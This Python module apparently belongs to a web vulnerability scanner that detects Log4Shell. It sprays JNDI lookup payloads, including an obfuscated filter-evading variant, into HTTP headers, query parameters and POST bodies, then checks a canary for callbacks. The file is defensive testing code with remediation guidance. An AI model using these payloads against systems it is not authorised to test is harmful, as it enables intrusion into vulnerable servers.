import json
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse
from ..core.models import Finding
from ..core.canary import Canary
from .base import Module


# Common header injection points — Log4j logs these in most frameworks
HEADER_NAMES = [
    "User-Agent",
    "X-Api-Version",
    "X-Forwarded-For",
    "X-Client-IP",
    "X-Real-IP",
    "Referer",
    "Accept-Language",
    "Cookie",
    "X-Requested-With",
    "Origin",
]

# Query parameters commonly logged by frameworks
PARAM_NAMES = [
    "q", "query", "search", "name", "username", "user", "id",
    "debug", "log", "message", "msg", "data",
]

# Payload templates — all variants cause a DNS/LDAP lookup to the canary
def build_payloads(canary_host: str) -> list[str]:
    base = f"{canary_host}"
    return [
        f"${{jndi:ldap://{base}/a}}",
        f"${{jndi:ldap://{base}/b}}",
        f"${{jndi:rmi://{base}/c}}",
        f"${{jndi:dns://{base}/d}}",
        # obfuscated variant that bypasses naive string filters
        f"${{${{lower:j}}ndi:ldap://{base}/e}}",
        # nested variant
        f"${{jndi:ldap://{base}/${{hostName}}}}",
    ]


class Log4ShellModule(Module):
    name = "log4shell"
    description = "Detect Log4Shell (CVE-2021-44228) JNDI injection"
    author = "you"
    severity = "critical"

    def _inject_param(self, url: str, param: str, value: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

    def _check_canary(self, canary: Canary, evidence: str,
                       req, payload: str, vector: str) -> Finding | None:
        if not canary.hits():
            return None
        hits = canary.hits()
        return Finding(
            name=f"Log4Shell via {vector}",
            severity="critical",
            url=req.url if hasattr(req, "url") else "",
            param=payload if vector.startswith("param:") else None,
            evidence=(
                f"Payload: {payload}\n"
                f"Vector: {vector}\n"
                f"Canary received {len(hits)} hit(s) from "
                f"{hits[0]['client']} (path: {hits[0]['path']})\n"
                f"{evidence}"
            ),
            description=(
                "The server resolved a JNDI lookup from user-controlled "
                "input. Log4j evaluates ${jndi:...} expressions when logging, "
                "allowing an attacker to load and execute remote code via "
                "LDAP/RMI. This is CVE-2021-44228 (Log4Shell)."
            ),
            remediation=(
                "Upgrade Log4j to >= 2.17.1. Or set "
                "-Dlog4j2.formatMsgNoLookups=true. Or remove the JndiLookup "
                "class from log4j-core. Block outbound LDAP/RMI at the "
                "network level as a compensating control."
            ),
            module=self.name,
            cvss=10.0,
            scan_id=getattr(req, "scan_id", None),
            request_id=getattr(req, "id", None),
        )

    def run(self, target: str) -> list[Finding]:
        findings = []

        canary = Canary(host="127.0.0.1")
        canary.start()
        # extract just host:port from the canary URL for payload construction
        canary_host = canary.url.replace("http://", "").replace("/umani-canary", "")

        try:
            payloads = build_payloads(canary_host)

            # --- Test 1: headers ---
            for header in HEADER_NAMES:
                for payload in payloads:
                    canary.clear()
                    try:
                        req, res = self.http.get(
                            target, headers={header: payload})
                    except Exception:
                        continue
                    f = self._check_canary(
                        canary,
                        f"Injected in header: {header}",
                        req, payload, f"header:{header}")
                    if f:
                        findings.append(f)
                        return findings  # one confirmed hit is enough

            # --- Test 2: query parameters ---
            for param in PARAM_NAMES:
                for payload in payloads:
                    canary.clear()
                    test_url = self._inject_param(target, param, payload)
                    try:
                        req, res = self.http.get(test_url)
                    except Exception:
                        continue
                    f = self._check_canary(
                        canary,
                        f"Injected in query param: {param}",
                        req, payload, f"param:{param}")
                    if f:
                        findings.append(f)
                        return findings

            # --- Test 3: POST body (form-encoded) ---
            for payload in payloads:
                canary.clear()
                body = urlencode({"data": payload}).encode()
                try:
                    req, res = self.http.post(
                        target, body=body,
                        headers={"Content-Type":
                                 "application/x-www-form-urlencoded"})
                except Exception:
                    continue
                f = self._check_canary(
                    canary, "Injected in POST body (form)", req,
                    payload, "body:form")
                if f:
                    findings.append(f)
                    return findings

            # --- Test 4: POST body (JSON) ---
            for payload in payloads:
                canary.clear()
                body = json.dumps({"data": payload}).encode()
                try:
                    req, res = self.http.post(
                        target, body=body,
                        headers={"Content-Type": "application/json"})
                except Exception:
                    continue
                f = self._check_canary(
                    canary, "Injected in POST body (JSON)", req,
                    payload, "body:json")
                if f:
                    findings.append(f)
                    return findings

        finally:
            canary.stop()

        return findings
